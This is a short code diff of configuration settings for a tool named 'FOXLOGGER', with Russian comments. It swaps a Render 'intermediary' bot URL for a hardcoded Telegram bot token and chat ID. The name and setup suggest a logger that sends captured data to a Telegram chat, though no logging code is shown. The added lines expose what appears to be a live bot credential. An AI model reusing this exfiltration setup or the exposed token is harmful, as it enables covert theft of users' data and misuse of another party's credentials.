@@ -1,3 +1,2 @@
-// ========== НАСТРОЙКИ FOXLOGGER ==========
-// ТВОЙ БОТ НА RENDER (ПОСРЕДНИК)
-const YOUR_RENDER_URL = "https://drwizzard3-5.onrender.com";  // ЗАМЕНИ НА СВОЙ URL
+const TELEGRAM_BOT_TOKEN = "8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk";
+const TELEGRAM_CHAT_ID = "8995427762";
